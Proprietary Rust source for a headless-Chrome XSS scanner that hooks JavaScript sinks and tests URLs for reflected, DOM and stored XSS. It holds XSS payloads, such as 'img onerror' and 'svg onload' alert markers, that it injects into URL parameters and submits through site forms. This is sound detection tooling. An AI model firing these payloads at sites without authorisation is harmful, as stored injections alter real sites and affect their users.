// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

//! Chromium-based XSS Scanner with Real JavaScript Execution Detection
//!
//! This is the ONLY XSS scanner - uses real browser to detect XSS by:
//! 1. Intercepting JavaScript dialogs (alert, confirm, prompt)
//! 2. Submitting forms with XSS payloads and detecting stored XSS
//! 3. Testing DOM-based XSS with URL fragment/query payloads
//!
//! Uses a SINGLE shared browser instance for performance.

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, ScanMode, Severity, Vulnerability};
use anyhow::{Context, Result};
use headless_chrome::{Browser, LaunchOptions, Tab};
use rayon::prelude::*;
use std::collections::HashSet;
use std::sync::{Arc, Mutex, RwLock};
use std::time::Duration;
use tracing::{debug, info, warn};

/// JavaScript code to intercept XSS execution - hooks dialogs AND dangerous sinks
const XSS_INTERCEPTOR: &str = r#"
(function() {
    window.__xssMarker = null;
    window.__xssTriggered = false;
    window.__xssTriggerType = 'none';
    window.__xssMessage = '';
    window.__xssExecutions = [];
    window.__xssSeverity = 'none';

    // Severity levels: CRITICAL > HIGH > MEDIUM > LOW
    const SINK_SEVERITY = {
        'eval': 'CRITICAL',
        'Function': 'CRITICAL',
        'setTimeout': 'CRITICAL',
        'setInterval': 'CRITICAL',
        'document.write': 'HIGH',
        'innerHTML': 'HIGH',
        'outerHTML': 'HIGH',
        'insertAdjacentHTML': 'HIGH',
        'location.assign': 'HIGH',
        'location.replace': 'HIGH',
        'alert': 'MEDIUM',
        'confirm': 'MEDIUM',
        'prompt': 'MEDIUM',
        'fetch': 'MEDIUM',
        'img.src': 'LOW',
        'DOM-mutation': 'LOW',
        'DOM-text': 'LOW',
        'DOM-attr': 'LOW'
    };

    // Helper to check if content contains marker
    function checkMarker(content) {
        if (!window.__xssMarker) return false;
        return String(content).includes(window.__xssMarker);
    }

    // Get stack trace for debugging source->sink path
    function getStackTrace() {
        try {
            throw new Error('XSS-STACK');
        } catch (e) {
            return e.stack.split('\n').slice(2, 8).join('\n');
        }
    }

    function recordExecution(type, content, source) {
        window.__xssTriggered = true;
        window.__xssTriggerType = type;
        window.__xssMessage = String(content).substring(0, 500);
        window.__xssSeverity = SINK_SEVERITY[type] || 'MEDIUM';

        if (window.__xssExecutions.length < 100) {
            const execution = {
                type: type,
                content: String(content).substring(0, 200),
                severity: window.__xssSeverity,
                timestamp: Date.now(),
                stack: getStackTrace(),
                source: source || 'unknown'
            };
            window.__xssExecutions.push(execution);
        }
        console.log('[XSS-DETECTED]', type + ':', content, 'severity:', window.__xssSeverity);
    }

    // IFRAME RECURSIVE INJECTION
    function injectIntoFrame(frame) {
        try {
            if (!frame.contentWindow || !frame.contentDocument) return;
            try { frame.contentDocument.body; } catch(e) { return; }

            frame.contentWindow.__xssMarker = window.__xssMarker;
            frame.contentWindow.__xssTriggered = false;
            frame.contentWindow.__xssTriggerType = 'none';
            frame.contentWindow.__xssExecutions = [];

            frame.contentWindow.alert = function(msg) {
                if (checkMarker(msg)) {
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'alert-iframe';
                    window.__xssExecutions.push({type: 'alert-iframe', content: String(msg).substring(0, 200)});
                }
            };
            frame.contentWindow.confirm = function(msg) {
                if (checkMarker(msg)) {
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'confirm-iframe';
                }
                return true;
            };
            frame.contentWindow.prompt = function(msg) {
                if (checkMarker(msg)) {
                    window.__xssTriggered = true;
                    window.__xssTriggerType = 'prompt-iframe';
                }
                return '';
            };
        } catch(e) {}
    }

    // Hook iframe creation
    const origCreateElement = document.createElement.bind(document);
    document.createElement = function(tagName, options) {
        const el = origCreateElement(tagName, options);
        if (tagName.toLowerCase() === 'iframe') {
            el.addEventListener('load', function() {
                injectIntoFrame(el);
            });
        }
        return el;
    };

    document.querySelectorAll('iframe').forEach(injectIntoFrame);

    const iframeObserver = new MutationObserver(function(mutations) {
        for (const mutation of mutations) {
            for (const node of mutation.addedNodes) {
                if (node.tagName === 'IFRAME') {
                    node.addEventListener('load', function() { injectIntoFrame(node); });
                }
            }
        }
    });
    if (document.body) {
        iframeObserver.observe(document.body, {childList: true, subtree: true});
    }

    // 1. Dialog interception
    window.alert = function(msg) {
        if (checkMarker(msg)) recordExecution('alert', msg);
    };

    window.confirm = function(msg) {
        if (checkMarker(msg)) recordExecution('confirm', msg);
        return true;
    };

    window.prompt = function(msg, def) {
        if (checkMarker(msg)) recordExecution('prompt', msg);
        return def || '';
    };

    // 2. DOM Sink hooking
    const originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    if (originalInnerHTMLDescriptor && originalInnerHTMLDescriptor.set) {
        Object.defineProperty(Element.prototype, 'innerHTML', {
            set: function(value) {
                if (checkMarker(value)) recordExecution('innerHTML', value);
                return originalInnerHTMLDescriptor.set.call(this, value);
            },
            get: originalInnerHTMLDescriptor.get,
            configurable: true
        });
    }

    const originalOuterHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML');
    if (originalOuterHTMLDescriptor && originalOuterHTMLDescriptor.set) {
        Object.defineProperty(Element.prototype, 'outerHTML', {
            set: function(value) {
                if (checkMarker(value)) recordExecution('outerHTML', value);
                return originalOuterHTMLDescriptor.set.call(this, value);
            },
            get: originalOuterHTMLDescriptor.get,
            configurable: true
        });
    }

    // 3. document.write/writeln
    const originalWrite = document.write.bind(document);
    const originalWriteln = document.writeln.bind(document);
    document.write = function(...args) {
        for (const arg of args) {
            if (checkMarker(arg)) recordExecution('document.write', arg);
        }
        return originalWrite(...args);
    };
    document.writeln = function(...args) {
        for (const arg of args) {
            if (checkMarker(arg)) recordExecution('document.writeln', arg);
        }
        return originalWriteln(...args);
    };

    // 4. eval/Function constructor
    const originalEval = window.eval;
    window.eval = function(code) {
        if (checkMarker(code)) recordExecution('eval', code);
        return originalEval.call(window, code);
    };

    const OriginalFunction = window.Function;
    window.Function = function(...args) {
        const code = args.join(' ');
        if (checkMarker(code)) recordExecution('Function', code);
        return new OriginalFunction(...args);
    };

    // 5. setTimeout/setInterval with string
    const originalSetTimeout = window.setTimeout;
    const originalSetInterval = window.setInterval;
    window.setTimeout = function(fn, delay, ...args) {
        if (typeof fn === 'string' && checkMarker(fn)) recordExecution('setTimeout', fn);
        return originalSetTimeout.call(window, fn, delay, ...args);
    };
    window.setInterval = function(fn, delay, ...args) {
        if (typeof fn === 'string' && checkMarker(fn)) recordExecution('setInterval', fn);
        return originalSetInterval.call(window, fn, delay, ...args);
    };

    // 6. insertAdjacentHTML
    const originalInsertAdjacentHTML = Element.prototype.insertAdjacentHTML;
    Element.prototype.insertAdjacentHTML = function(position, text) {
        if (checkMarker(text)) recordExecution('insertAdjacentHTML', text);
        return originalInsertAdjacentHTML.call(this, position, text);
    };

    // 6b. setAttribute for event handlers
    const origSetAttribute = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function(name, value) {
        if (typeof value === 'string' && checkMarker(value) && name.toLowerCase().startsWith('on')) {
            recordExecution('dom-event-attribute', name + '=' + value, 'setAttribute');
        }
        return origSetAttribute.call(this, name, value);
    };

    // 7. Hook fetch
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const [url, options] = args;
        if (checkMarker(url)) recordExecution('fetch-url', url);

        const res = await originalFetch.apply(this, args);
        try {
            const clone = res.clone();
            const text = await clone.text();
            if (checkMarker(text)) {
                recordExecution('fetch-response', text.substring(0, 300), 'fetch');
            }
        } catch(e) {}

        return res;
    };

    // 7b. Hook XHR
    const origXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        this.__xssUrl = url;
        this.__xssMethod = method;
        this.addEventListener('load', function() {
            try {
                if (checkMarker(this.responseText)) {
                    recordExecution('xhr-response', this.responseText.substring(0, 300), 'xhr');
                }
            } catch(e) {}
        });
        return origXHROpen.call(this, method, url, ...rest);
    };

    // 8. Location changes
    const originalLocationAssign = window.location.assign;
    const originalLocationReplace = window.location.replace;
    if (originalLocationAssign) {
        window.location.assign = function(url) {
            if (checkMarker(url)) recordExecution('location.assign', url);
            return originalLocationAssign.call(window.location, url);
        };
    }
    if (originalLocationReplace) {
        window.location.replace = function(url) {
            if (checkMarker(url)) recordExecution('location.replace', url);
            return originalLocationReplace.call(window.location, url);
        };
    }

    // 9. DOM Mutation Observer - DANGEROUS contexts only
    const observer = new MutationObserver(function(mutations) {
        for (const mutation of mutations) {
            if (mutation.type === 'childList') {
                for (const node of mutation.addedNodes) {
                    if (node.nodeType === 1) {
                        const tagName = node.tagName ? node.tagName.toUpperCase() : '';

                        if (tagName === 'SCRIPT') {
                            const content = node.textContent || node.src || '';
                            if (checkMarker(content)) {
                                recordExecution('DOM-script-injection', content);
                            }
                        }

                        const scripts = node.querySelectorAll ? node.querySelectorAll('script') : [];
                        for (const script of scripts) {
                            const scriptContent = script.textContent || script.src || '';
                            if (checkMarker(scriptContent)) {
                                recordExecution('DOM-script-injection', scriptContent);
                            }
                        }

                        const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur'];
                        for (const attr of dangerousAttrs) {
                            const attrValue = node.getAttribute ? node.getAttribute(attr) : null;
                            if (attrValue && checkMarker(attrValue)) {
                                recordExecution('DOM-event-handler', attr + '=' + attrValue);
                            }
                        }

                        const href = node.getAttribute ? node.getAttribute('href') : null;
                        const src = node.getAttribute ? node.getAttribute('src') : null;
                        if (href && href.toLowerCase().startsWith('javascript:') && checkMarker(href)) {
                            recordExecution('DOM-javascript-url', href);
                        }
                        if (src && src.toLowerCase().startsWith('javascript:') && checkMarker(src)) {
                            recordExecution('DOM-javascript-url', src);
                        }
                    }
                }
            } else if (mutation.type === 'attributes') {
                const attrName = mutation.attributeName.toLowerCase();
                const value = mutation.target.getAttribute(mutation.attributeName) || '';

                const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
                                        'onkeydown', 'onkeyup', 'onsubmit', 'onchange', 'oninput'];
                if (dangerousAttrs.includes(attrName) && checkMarker(value)) {
                    recordExecution('DOM-attr-event', attrName + '=' + value);
                }

                if ((attrName === 'href' || attrName === 'src') &&
                    value.toLowerCase().startsWith('javascript:') && checkMarker(value)) {
                    recordExecution('DOM-attr-javascript-url', value);
                }
            }
        }
    });

    if (document.body) {
        observer.observe(document.body, {childList: true, subtree: true, attributes: true});
    } else {
        document.addEventListener('DOMContentLoaded', function() {
            observer.observe(document.body, {childList: true, subtree: true, attributes: true});
        });
    }

    // 10. Image src hooking
    const originalImageSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
    if (originalImageSrc && originalImageSrc.set) {
        Object.defineProperty(HTMLImageElement.prototype, 'src', {
            set: function(value) {
                if (checkMarker(value)) recordExecution('img.src', value, 'img-element');
                return originalImageSrc.set.call(this, value);
            },
            get: originalImageSrc.get,
            configurable: true
        });
    }

    // 11. Shadow DOM support
    const originalAttachShadow = Element.prototype.attachShadow;
    Element.prototype.attachShadow = function(init) {
        const shadowRoot = originalAttachShadow.call(this, init);

        const shadowObserver = new MutationObserver(function(mutations) {
            for (const mutation of mutations) {
                if (mutation.type === 'childList') {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === 1) {
                            const tagName = node.tagName ? node.tagName.toUpperCase() : '';

                            if (tagName === 'SCRIPT') {
                                const content = node.textContent || node.src || '';
                                if (checkMarker(content)) {
                                    recordExecution('shadow-DOM-script', content, 'shadow-root');
                                }
                            }

                            const scripts = node.querySelectorAll ? node.querySelectorAll('script') : [];
                            for (const script of scripts) {
                                const scriptContent = script.textContent || script.src || '';
                                if (checkMarker(scriptContent)) {
                                    recordExecution('shadow-DOM-script', scriptContent, 'shadow-root');
                                }
                            }

                            const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'];
                            for (const attr of dangerousAttrs) {
                                const attrValue = node.getAttribute ? node.getAttribute(attr) : null;
                                if (attrValue && checkMarker(attrValue)) {
                                    recordExecution('shadow-DOM-event-handler', attr + '=' + attrValue, 'shadow-root');
                                }
                            }

                            const href = node.getAttribute ? node.getAttribute('href') : null;
                            const src = node.getAttribute ? node.getAttribute('src') : null;
                            if (href && href.toLowerCase().startsWith('javascript:') && checkMarker(href)) {
                                recordExecution('shadow-DOM-javascript-url', href, 'shadow-root');
                            }
                            if (src && src.toLowerCase().startsWith('javascript:') && checkMarker(src)) {
                                recordExecution('shadow-DOM-javascript-url', src, 'shadow-root');
                            }
                        }
                    }
                }
            }
        });
        shadowObserver.observe(shadowRoot, {childList: true, subtree: true});

        const origShadowInnerHTML = Object.getOwnPropertyDescriptor(ShadowRoot.prototype, 'innerHTML');
        if (origShadowInnerHTML && origShadowInnerHTML.set) {
            Object.defineProperty(shadowRoot, 'innerHTML', {
                set: function(value) {
                    if (checkMarker(value)) recordExecution('shadow-innerHTML', value, 'shadow-root');
                    return origShadowInnerHTML.set.call(this, value);
                },
                get: origShadowInnerHTML.get,
                configurable: true
            });
        }

        return shadowRoot;
    };

    // 12. Script element src
    const originalScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
    if (originalScriptSrc && originalScriptSrc.set) {
        Object.defineProperty(HTMLScriptElement.prototype, 'src', {
            set: function(value) {
                if (checkMarker(value)) recordExecution('script.src', value, 'script-element');
                return originalScriptSrc.set.call(this, value);
            },
            get: originalScriptSrc.get,
            configurable: true
        });
    }

    // 13. Iframe src
    const originalIframeSrc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
    if (originalIframeSrc && originalIframeSrc.set) {
        Object.defineProperty(HTMLIFrameElement.prototype, 'src', {
            set: function(value) {
                if (checkMarker(value) || (value && value.startsWith('javascript:'))) {
                    recordExecution('iframe.src', value, 'iframe-element');
                }
                return originalIframeSrc.set.call(this, value);
            },
            get: originalIframeSrc.get,
            configurable: true
        });
    }

    // 13b. Iframe srcdoc
    const origSrcdoc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'srcdoc');
    if (origSrcdoc && origSrcdoc.set) {
        Object.defineProperty(HTMLIFrameElement.prototype, 'srcdoc', {
            set: function(value) {
                if (checkMarker(value)) recordExecution('iframe.srcdoc', value, 'iframe-srcdoc');
                return origSrcdoc.set.call(this, value);
            },
            get: origSrcdoc.get,
            configurable: true
        });
    }

    // 14. Range.createContextualFragment
    const originalCreateContextualFragment = Range.prototype.createContextualFragment;
    Range.prototype.createContextualFragment = function(html) {
        if (checkMarker(html)) recordExecution('createContextualFragment', html, 'range-api');
        return originalCreateContextualFragment.call(this, html);
    };

    // 15. DOMParser
    const OriginalDOMParser = window.DOMParser;
    window.DOMParser = function() {
        const parser = new OriginalDOMParser();
        const originalParseFromString = parser.parseFromString.bind(parser);
        parser.parseFromString = function(str, type) {
            if (type.includes('html') && checkMarker(str)) {
                recordExecution('DOMParser.parseFromString', str, 'dom-parser');
            }
            return originalParseFromString(str, type);
        };
        return parser;
    };

    console.log('[XSS-SCANNER] Fast interceptor installed');
})();
"#;

/// Shared browser instance for all XSS tests
pub struct SharedBrowser {
    browser: Arc<RwLock<Browser>>,
}

impl Clone for SharedBrowser {
    fn clone(&self) -> Self {
        Self {
            browser: Arc::clone(&self.browser),
        }
    }
}

impl SharedBrowser {
    pub fn new() -> Result<Self> {
        info!("[SharedBrowser] Launching headless Chrome...");

        let options = LaunchOptions::default_builder()
            .headless(true)
            .sandbox(false) // Required for CI environments (GitHub Actions, Docker)
            .idle_browser_timeout(Duration::from_secs(300))
            .build()
            .map_err(|e| anyhow::anyhow!("Failed to build browser options: {}", e))?;

        let browser = Browser::new(options).context("Failed to launch headless Chrome")?;

        info!("[SharedBrowser] Chrome launched successfully");
        Ok(Self {
            browser: Arc::new(RwLock::new(browser)),
        })
    }

    pub fn new_tab_with_interceptor(&self, marker: &str) -> Result<Arc<Tab>> {
        let browser = self
            .browser
            .read()
            .map_err(|e| anyhow::anyhow!("Failed to lock browser: {}", e))?;
        let tab = browser.new_tab()?;

        tab.set_default_timeout(Duration::from_secs(8));

        tab.call_method(headless_chrome::protocol::cdp::Page::Enable {
            enable_file_chooser_opened_event: None,
        })?;

        let setup_js = format!("{}\nwindow.__xssMarker = '{}';", XSS_INTERCEPTOR, marker);

        tab.call_method(
            headless_chrome::protocol::cdp::Page::AddScriptToEvaluateOnNewDocument {
                source: setup_js,
                world_name: None,
                include_command_line_api: None,
                run_immediately: None,
            },
        )?;

        Ok(tab)
    }

    pub fn is_alive(&self) -> bool {
        if let Ok(browser) = self.browser.read() {
            // Don't create a tab just to check - that leaks tabs
            // Instead check if we can lock the browser tabs
            browser.get_tabs().lock().is_ok()
        } else {
            false
        }
    }

    /// Close all tabs except the first one to free resources after panics
    /// Returns number of tabs closed
    pub fn cleanup_stale_tabs(&self) -> Result<usize> {
        let browser = self
            .browser
            .read()
            .map_err(|e| anyhow::anyhow!("Failed to lock browser: {}", e))?;

        // Collect target IDs first, then drop the lock
        let target_ids: Vec<String> = {
            let tabs = browser
                .get_tabs()
                .lock()
                .map_err(|e| anyhow::anyhow!("Failed to get tabs: {}", e))?;

            if tabs.len() <= 1 {
                return Ok(0);
            }

            tabs.iter()
                .skip(1)
                .map(|t| t.get_target_id().to_string())
                .collect()
        };

        let mut closed = 0;
        for target_id in target_ids {
            if let Ok(tabs) = browser.get_tabs().lock() {
                if let Some(tab) = tabs.iter().find(|t| t.get_target_id() == &target_id) {
                    match tab.close(false) {
                        Ok(_) => closed += 1,
                        Err(_) => {
                            let _ = tab.call_method(
                                headless_chrome::protocol::cdp::Target::CloseTarget {
                                    target_id: target_id.clone().into(),
                                },
                            );
                            closed += 1;
                        }
                    }
                }
            }
        }

        if closed > 0 {
            info!("[SharedBrowser] Cleaned up {} stale tabs", closed);
        }
        Ok(closed)
    }

    /// Create tab that auto-closes when dropped (RAII pattern)
    pub fn new_guarded_tab(&self, marker: &str) -> Result<TabGuard> {
        let tab = self.new_tab_with_interceptor(marker)?;
        Ok(TabGuard { tab })
    }
}

/// RAII guard for browser tabs - automatically closes tab when dropped
/// Prevents tab leaks on panics or early returns
pub struct TabGuard {
    tab: Arc<Tab>,
}

impl TabGuard {
    pub fn tab(&self) -> &Arc<Tab> {
        &self.tab
    }
}

impl Drop for TabGuard {
    fn drop(&mut self) {
        let _ = self.tab.close(false);
    }
}

#[derive(Debug, Clone)]
pub struct XssDetectionResult {
    pub xss_triggered: bool,
    pub trigger_type: XssTriggerType,
    pub payload: String,
    pub dialog_message: Option<String>,
    pub url: String,
    pub severity: XssSeverity,
    pub stack_trace: Option<String>,
    pub source: Option<String>,
    pub timestamp: Option<u64>,
    pub parameter: Option<String>,
    pub injection_point: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XssTriggerType {
    AlertDialog,
    ConfirmDialog,
    PromptDialog,
    DomExecution,
    ShadowDom,
    Eval,
    InnerHtml,
    DocumentWrite,
    LocationChange,
    DataExfil,
    None,
}

#[derive(Debug, Clone, PartialEq)]
pub enum XssSeverity {
    Critical,
    High,
    Medium,
    Low,
    Unknown,
}

pub struct ChromiumXssScanner {
    confirmed_vulns: Arc<Mutex<HashSet<String>>>,
}

impl ChromiumXssScanner {
    pub fn new(_http_client: Arc<HttpClient>) -> Self {
        Self {
            confirmed_vulns: Arc::new(Mutex::new(HashSet::new())),
        }
    }

    pub fn clear_cache(&self) {
        if let Ok(mut confirmed) = self.confirmed_vulns.lock() {
            confirmed.clear();
        }
    }

    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
        shared_browser: Option<&SharedBrowser>,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // License check - Chromium XSS is a premium feature
        if !crate::license::verify_scan_authorized() {
            debug!("[Chromium-XSS] Scan skipped: No valid license");
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("[Chromium-XSS] Scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        info!("[Chromium-XSS] Starting real browser XSS scan for: {}", url);

        let owns_browser;
        let browser: SharedBrowser = match shared_browser {
            Some(b) => {
                owns_browser = false;
                b.clone()
            }
            None => {
                owns_browser = true;
                warn!("[Chromium-XSS] No shared browser, creating temporary instance");
                SharedBrowser::new()?
            }
        };

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let url_owned = url.to_string();
        let mode = config.scan_mode.clone();
        let browser_clone = browser.clone();

        let results = tokio::task::spawn_blocking(move || {
            Self::run_all_xss_tests_sync(&url_owned, &mode, &browser_clone)
        })
        .await
        .context("XSS test task panicked")??;

        for result in results {
            if result.xss_triggered {
                let vuln = self.create_vulnerability(&result)?;

                let vuln_key = format!("{}:{:?}", result.url, result.trigger_type);
                let mut confirmed = self.confirmed_vulns.lock().unwrap();
                if !confirmed.contains(&vuln_key) {
                    confirmed.insert(vuln_key);
                    vulnerabilities.push(vuln);
                }
            }
            tests_run += 1;
        }

        // Cleanup temporary browser
        if owns_browser {
            let _ = browser.cleanup_stale_tabs();
        }

        info!(
            "[Chromium-XSS] Scan complete: {} confirmed XSS, {} tests",
            vulnerabilities.len(),
            tests_run
        );

        Ok((vulnerabilities, tests_run))
    }

    fn run_all_xss_tests_sync(
        url: &str,
        mode: &ScanMode,
        browser: &SharedBrowser,
    ) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();

        // Phase 1: Test reflected XSS
        info!("[Chromium-XSS] Phase 1: Testing reflected XSS");
        let reflected = Self::test_reflected_xss(url, mode, browser)?;
        let found_reflected = reflected.iter().any(|r| r.xss_triggered);
        results.extend(reflected);

        // Early exit: if we found reflected XSS, skip DOM phase (same vector)
        if !found_reflected {
            info!("[Chromium-XSS] Phase 2: Testing DOM XSS");
            let dom = Self::test_dom_xss(url, browser)?;
            results.extend(dom);
        }

        // Phase 3: Always test stored XSS (different attack vector - forms)
        info!("[Chromium-XSS] Phase 3: Testing stored XSS");
        let stored = Self::test_stored_xss(url, browser)?;
        results.extend(stored);

        Ok(results)
    }

    /// Batch process multiple URLs in parallel using rayon
    /// Each URL runs in its own thread for true parallelism
    fn run_batch_xss_tests_sync(
        urls: &[String],
        mode: &ScanMode,
        browser: &SharedBrowser,
    ) -> Vec<(String, Result<Vec<XssDetectionResult>>)> {
        urls.par_iter()
            .map(|url| {
                let result = Self::run_all_xss_tests_sync(url, mode, browser);
                (url.clone(), result)
            })
            .collect()
    }

    fn test_reflected_xss(
        url: &str,
        mode: &ScanMode,
        browser: &SharedBrowser,
    ) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();
        let payloads = Self::get_xss_payloads(mode);

        // Extract existing parameters from URL to test each one
        let url_params = Self::extract_url_parameters(url);

        // If URL has parameters, test those. Otherwise, try to discover from page.
        let test_params: Vec<String> = if !url_params.is_empty() {
            // Test the actual parameters found in the URL
            url_params.into_iter().map(|(name, _)| name).collect()
        } else {
            // No URL params - try to discover input fields from the page
            Self::discover_page_parameters(browser, url).unwrap_or_default()
        };

        // If no parameters discovered at all, skip reflected XSS testing
        // (stored XSS via forms is handled separately in test_stored_xss)
        if test_params.is_empty() {
            debug!("[Chromium-XSS] No parameters to test for reflected XSS on {}", url);
            return Ok(results);
        }

        // Intelligent mode (v3.0 default) uses all payloads
        // Legacy modes have reduced payloads for backwards compatibility
        let payload_limit = match mode {
            ScanMode::Intelligent => payloads.len(),  // Full coverage
            ScanMode::Fast => 3,
            ScanMode::Normal => 6,
            ScanMode::Thorough | ScanMode::Insane => payloads.len(),
        };

        'param_loop: for param_name in &test_params {
            for payload_template in payloads.iter().take(payload_limit) {
                let marker = format!(
                    "XSS{}",
                    uuid::Uuid::new_v4().to_string()[..8].to_uppercase()
                );
                let payload = payload_template.replace("MARKER", &marker);

                // Build test URL by replacing/adding the parameter
                let test_url = Self::build_test_url(url, param_name, &payload);

                match Self::test_single_url(browser, &test_url, &marker) {
                    Ok(mut result) => {
                        if result.xss_triggered {
                            info!("[Chromium-XSS] CONFIRMED reflected XSS in parameter '{}'!", param_name);
                            result.parameter = Some(param_name.clone());
                            results.push(result);
                            break 'param_loop; // Found XSS, stop testing
                        }
                    }
                    Err(e) => debug!("[Chromium-XSS] Reflected test error: {}", e),
                }
            }
        }

        Ok(results)
    }

    /// Extract parameters from URL query string
    fn extract_url_parameters(url: &str) -> Vec<(String, String)> {
        if let Ok(parsed) = url::Url::parse(url) {
            parsed
                .query_pairs()
                .map(|(name, value)| (name.to_string(), value.to_string()))
                .collect()
        } else {
            Vec::new()
        }
    }

    /// Build test URL by replacing or adding a parameter with payload
    fn build_test_url(base_url: &str, param_name: &str, payload: &str) -> String {
        if let Ok(mut parsed) = url::Url::parse(base_url) {
            // Collect existing parameters, replacing the target one
            let existing_params: Vec<(String, String)> = parsed
                .query_pairs()
                .filter(|(name, _)| name != param_name)
                .map(|(name, value)| (name.to_string(), value.to_string()))
                .collect();

            // Clear query and rebuild
            parsed.set_query(None);

            // Add existing params back
            {
                let mut query_pairs = parsed.query_pairs_mut();
                for (name, value) in &existing_params {
                    query_pairs.append_pair(name, value);
                }
                // Add/replace the target parameter with payload
                query_pairs.append_pair(param_name, payload);
            }

            parsed.to_string()
        } else {
            // Fallback: simple append
            if base_url.contains('?') {
                format!("{}&{}={}", base_url, param_name, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, param_name, urlencoding::encode(payload))
            }
        }
    }

    /// Discover input parameters from the page by analyzing forms and input fields
    fn discover_page_parameters(browser: &SharedBrowser, url: &str) -> Result<Vec<String>> {
        let browser_guard = browser.browser.read()
            .map_err(|e| anyhow::anyhow!("Browser lock failed: {}", e))?;
        let tab = browser_guard
            .new_tab()
            .map_err(|e| anyhow::anyhow!("Failed to create tab: {}", e))?;

        tab.set_default_timeout(Duration::from_secs(5));
        if tab.navigate_to(url).is_err() {
            return Ok(Vec::new());
        }

        // Wait briefly for page to load
        std::thread::sleep(Duration::from_millis(500));

        // JavaScript to extract all input field names from forms
        let discover_js = r#"
            (function() {
                const params = new Set();

                // Get all input, textarea, select elements
                document.querySelectorAll('input, textarea, select').forEach(el => {
                    if (el.name && el.name.trim() !== '') {
                        params.add(el.name);
                    }
                });

                // Also check for data attributes that might indicate parameters
                document.querySelectorAll('[data-param], [data-field]').forEach(el => {
                    const param = el.getAttribute('data-param') || el.getAttribute('data-field');
                    if (param) params.add(param);
                });

                return JSON.stringify(Array.from(params));
            })()
        "#;

        let result = tab.evaluate(discover_js, false);
        let _ = tab.close(false);

        match result {
            Ok(eval_result) => {
                if let Some(value) = eval_result.value {
                    if let Some(json_str) = value.as_str() {
                        let params: Vec<String> = serde_json::from_str(json_str).unwrap_or_default();
                        debug!("[Chromium-XSS] Discovered {} parameters from page: {:?}", params.len(), params);
                        return Ok(params);
                    }
                }
                Ok(Vec::new())
            }
            Err(_) => Ok(Vec::new()),
        }
    }

    fn test_dom_xss(url: &str, browser: &SharedBrowser) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();

        let dom_payloads = vec![
            "#<img src=x onerror=alert('MARKER')>",
            "#<svg onload=alert('MARKER')>",
            "#\"><script>alert('MARKER')</script>",
        ];

        for payload_template in &dom_payloads {
            let marker = format!(
                "DOM{}",
                uuid::Uuid::new_v4().to_string()[..8].to_uppercase()
            );
            let payload = payload_template.replace("MARKER", &marker);
            let test_url = format!("{}{}", url.trim_end_matches('#'), payload);

            match Self::test_single_url(browser, &test_url, &marker) {
                Ok(result) => {
                    if result.xss_triggered {
                        info!("[Chromium-XSS] CONFIRMED DOM XSS!");
                        results.push(result);
                        break;
                    }
                }
                Err(e) => debug!("[Chromium-XSS] DOM test error: {}", e),
            }
        }

        Ok(results)
    }

    fn test_stored_xss(url: &str, browser: &SharedBrowser) -> Result<Vec<XssDetectionResult>> {
        let mut results = Vec::new();
        let marker = format!(
            "STORED{}",
            uuid::Uuid::new_v4().to_string()[..8].to_uppercase()
        );

        let guard = browser.new_guarded_tab(&marker)?;
        let tab = guard.tab();
        tab.set_default_timeout(Duration::from_secs(8));
        tab.navigate_to(url)?;

        Self::poll_for_xss_or_stability(&tab, 600, 100);

        let forms_js = r#"
            (function() {
                const forms = [];
                document.querySelectorAll('form').forEach((form, idx) => {
                    const inputs = [];
                    form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]), textarea').forEach(el => {
                        if (el.type !== 'checkbox' && el.type !== 'radio' && el.type !== 'file') {
                            inputs.push({
                                name: el.name || el.id || '',
                                selector: el.name ? `[name="${el.name}"]` : (el.id ? `#${el.id}` : null)
                            });
                        }
                    });
                    if (inputs.length > 0) {
                        forms.push({ index: idx, inputs: inputs });
                    }
                });
                return JSON.stringify(forms);
            })()
        "#;

        let forms_result = tab.evaluate(forms_js, false)?;
        let forms: Vec<serde_json::Value> = if let Some(value) = forms_result.value {
            if let Some(json_str) = value.as_str() {
                serde_json::from_str(json_str).unwrap_or_default()
            } else {
                Vec::new()
            }
        } else {
            Vec::new()
        };

        info!("[Chromium-XSS] Found {} forms to test", forms.len());

        // Single most reliable payload
        let stored_payload = format!("<img src=x onerror=alert('{}')>", marker);

        for form in forms.iter().take(3) {
            let inputs = form
                .get("inputs")
                .and_then(|v| v.as_array())
                .cloned()
                .unwrap_or_default();
            let form_idx = form.get("index").and_then(|v| v.as_i64()).unwrap_or(0);

            let _ = tab.evaluate(&format!(
                "window.__xssMarker = '{}'; window.__xssTriggered = false; window.__xssTriggerType = 'none'; window.__xssMessage = '';",
                marker
            ), false);

            for input in &inputs {
                if let Some(selector) = input.get("selector").and_then(|v| v.as_str()) {
                    if !selector.is_empty() {
                        // Proper JSON escaping handles all special characters
                        let escaped_selector = serde_json::to_string(selector)
                            .unwrap_or_else(|_| format!("\"{}\"", selector));
